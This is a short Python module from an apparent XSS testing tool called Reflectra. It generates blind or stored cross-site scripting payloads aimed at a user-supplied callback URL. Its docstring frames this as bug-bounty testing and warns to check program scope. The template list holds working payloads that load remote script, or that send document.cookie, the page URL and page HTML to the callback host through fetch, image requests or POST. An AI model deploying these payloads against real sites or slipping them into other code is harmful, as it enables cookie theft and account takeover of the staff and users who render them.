"""
reflectra.blind
-----------------
Blind / stored XSS payload generation.

Reflectra does not run its own callback collector -- building and hosting
one securely (auth, per-user token isolation, abuse prevention) is a
project in itself, and every serious option already exists and is
maintained: XSS Hunter Express (self-hosted), xss.report, Burp Collaborator,
or Interactsh. Reinventing that here would be the least valuable part of
this tool and the highest-liability (you'd be hosting a JS-execution
callback service).

What this module does instead: given a callback URL you already control
(a Collaborator context URL, an xss.report bucket, a self-hosted XSS
Hunter Express endpoint, or your own Interactsh instance), it generates a
batch of blind-XSS payloads that exfiltrate to that URL and injects them
into every parameter of every target -- fire-and-forget, no dialog wait,
since confirmation happens out-of-band on your collector minutes/hours/days
later when a victim (support agent, admin reviewing a report, async worker)
renders the stored payload.

This is for use with programs that explicitly permit blind/stored XSS
testing and out-of-band collaborators. Check program scope before firing
these at anything -- blind payloads that land in an internal admin panel
you were not authorized to target is a fast way to turn a bug bounty
submission into an incident report about you.
"""

from __future__ import annotations

BLIND_TEMPLATES = [
    "<script src=\"{cb}\"></script>",
    "<img src=x onerror=\"fetch('{cb}?c='+document.cookie)\">",
    "<svg onload=\"fetch('{cb}?u='+location.href)\">",
    "\"><script src=\"{cb}\"></script>",
    "'><script src=\"{cb}\"></script>",
    "<script>new Image().src='{cb}?c='+encodeURIComponent(document.cookie);</script>",
    "<script>fetch('{cb}',{{method:'POST',body:document.documentElement.outerHTML.slice(0,2000)}})</script>",
]


def build_blind_payloads(callback_url: str) -> list[str]:
    if not callback_url:
        return []
    cb = callback_url.rstrip("/")
    return [tpl.format(cb=cb) for tpl in BLIND_TEMPLATES]
